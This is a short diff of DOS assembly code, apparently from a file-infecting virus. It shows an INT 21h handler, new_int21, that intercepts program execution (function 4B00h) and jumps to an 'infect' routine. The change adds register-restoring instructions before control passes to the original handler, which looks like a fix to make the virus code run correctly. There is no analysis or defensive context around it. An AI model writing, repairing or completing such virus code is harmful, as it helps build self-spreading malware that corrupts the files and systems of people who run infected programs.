@@ -52,7 +52,8 @@ new_int21:
      cmp ax, 4b00h        ; Load and Execute (Exec), function 0
      je infect            ; On entry: DS:DX = ASCIIZ filename pointer
 
-
+     pop bp
+     popa
 .call_int21:
      jmp short goto_int21
 
